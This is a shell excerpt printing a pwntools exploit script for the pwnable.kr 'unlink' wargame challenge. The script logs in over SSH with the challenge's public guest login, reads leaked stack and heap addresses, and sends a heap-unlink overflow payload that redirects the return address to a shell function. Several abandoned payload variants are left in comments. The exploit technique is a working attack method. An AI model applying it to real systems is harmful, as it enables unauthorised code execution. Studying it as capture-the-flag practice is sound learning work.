#unlink@pwnable:/tmp/u$ cat exp.py
from pwn import *

esp_leak = 0xffefdb54
ret_addr_location = 0xffefdb64

offset = ret_addr_location -esp_leak 

#p = process("/home/unlink/unlink")
shell = ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)
p = shell.process(executable="/home/unlink/unlink")
line = p.recvline()
print(line)
esp_leak = int(line.split()[-1], 16)
line = p.recvline()
print(line)
heap_leak = int(line.split()[-1], 16)

ret_addr_location = esp_leak + offset

shell_addr = 0x080484eb

#shellcode = "\xB8\xEB\x84\x04\x08\xFF\xD0"

shellcode = "\xcc"

#payload = cyclic(16) + p32(heap_leak+32) + p32(ret_addr_location) + p32(shell_addr)
#payload = cyclic(16) +p32(shell_addr)+ p32(heap_leak+32)+ p32(ret_addr_location)
#payload = cyclic(16) + p32(ret_addr_location-4) + p32(heap_leak+32)+ p32(shell_addr)
#payload = cyclic(16) + p32(ret_addr_location-4) + p32(shell_addr) +p32(heap_leak+32)
#payload = cyclic(16) + p32(ret_addr_location-4) + p32(heap_leak+32)+ "\xcc"
#payload = cyclic(16) + p32(ret_addr_location-4) +p32(ret_addr_location+4)
#payload = p32(shell_addr) + p32(shell_addr) +cyclic(8) + p32(ret_addr_location-4) + p32(heap_leak+8) + cyclic(20) + p32(shell_addr)
#payload = cyclic(16) + p32(heap_leak+0x38) + p32(ret_addr_location) + cyclic(24).upper() + shellcode
#payload = cyclic(16) + p32(heap_leak+0x30) + p32(heap_leak) + cyclic(20).upper() + p32(ret_addr_location-4)
#payload = p32(ret_addr_location) + p32(ret_addr_location) + cyclic(8)  +p32(heap_leak+0x38) +p32(heap_leak+8) + cyclic(40)
payload = cyclic(16) + p32(ret_addr_location-4) + p32(heap_leak+0x3c) + cyclic(24).upper() + p32(shell_addr) + p32(shell_addr)

p.sendline(payload)
p.interactive()
